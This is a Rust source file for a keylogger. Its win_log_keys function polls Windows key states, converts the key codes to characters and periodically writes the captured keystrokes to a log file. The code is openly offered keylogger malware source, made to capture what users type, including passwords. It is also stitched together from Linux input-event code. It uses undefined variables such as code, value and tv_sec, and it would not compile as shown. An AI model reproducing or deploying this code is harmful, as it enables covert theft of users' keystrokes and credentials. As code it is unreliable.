use std::{fs::{File, OpenOptions, self}, io::{self, BufRead, Read, Cursor}, path::Path, collections::HashMap, time::SystemTime};
use byteorder::{NativeEndian, ReadBytesExt};
use anyhow::Result;
// https://github.com/5ynatra/keylogger.rs/blob/master/src/main.rs


extern crate winapi;

pub(crate) fn win_log_keys(keyboard_device_path: String, log_file: String, write_interval: u64) -> Result<()> {
    let mut shift: bool = false;
    let mut capslock: bool = false;
    let mut ctrl: bool = false;
    let mut option: bool = false;
    let mut func: bool = false;
    
    
    let mut capture_buffer: String = "".to_string();
    let mut now = SystemTime::now();
    let qwerty_map_no_mod = super::get_key_hash_map();

    loop {
        now = SystemTime::now();

        for i in 8..190 {
            if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
                let key: String  = match i as u32 {
                    32 => " ".into(),
                    8 => "[delete]".into(),
                    13 => "[return]".into(),
                    winapi::VK_TAB => "[tab]".into(),
                    winapi::VK_SHIFT => "[Lshift]".into(),
                    winapi::VK_CONTROL => "[Lctrl]".into(),
                    winapi::VK_ESCAPE => "[escape]".into(),
                    winapi::VK_END => "[end]".into(),
                    winapi::VK_HOME => "[home]".into(),
                    winapi::VK_LEFT => "[leftarrow]".into(),
                    winapi::VK_UP => "[uparrow]".into(),
                    winapi::VK_RIGHT => "[rightarrow]".into(),
                    winapi::VK_DOWN => "[downarrow]".into(),
                    190|110 => ".".into(),
                    _ => (i as u8 as char).to_string()
                };
                println!("{}", key);
                capture_buffer.push_str(key);
                // write!(&mut file,"{}",key).unwrap();
                }
        }
        match now.elapsed() {
            Ok(elapsed) => {
                if elapsed.as_secs() >= write_interval {
                    if capture_buffer.len() > 0 {
                        super::log_keys_to_disk(capture_buffer.clone(), log_file.clone() )?;
                    }
                    capture_buffer = "".to_string();
                }
            }
            Err(e) => { println!("Error: {:?}", e); }
        }
        if qwerty_map_no_mod.contains_key(&code) {
            if value == 1 {
                if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = true };
                if qwerty_map_no_mod[&code] == "[capslock]" { capslock = !capslock };
                if qwerty_map_no_mod[&code] == "[Lctrl]" || qwerty_map_no_mod[&code] == "[Rctrl]" { ctrl = true };
                if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = true };
                if qwerty_map_no_mod[&code] == "[Loption]" || qwerty_map_no_mod[&code] == "[Roption]" { option = true };
                if qwerty_map_no_mod[&code] == "[Lfunction]" || qwerty_map_no_mod[&code] == "[Rfunction]" { func = true };

                capture_buffer.push_str(super::set_modifier(qwerty_map_no_mod[&code], shift, capslock, ctrl, option, func ).unwrap().as_str());
                
            }else if value == 0 {
                if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
                if qwerty_map_no_mod[&code] == "[Lctrl]" || qwerty_map_no_mod[&code] == "[Rctrl]" { ctrl = false };
                if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
                if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
            }
        } else if value == 1 || value == 0 {
            println!("{} {} {} {} {}", tv_sec, tv_usec, evtype, code, value);
        }
    }
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_nix_find_keyboard_device() -> Result<()> {
        let keyboard_device = nix_find_keyboard_device()?;
        assert!(keyboard_device.contains("/dev/input/event"));
        Ok(())
    }
}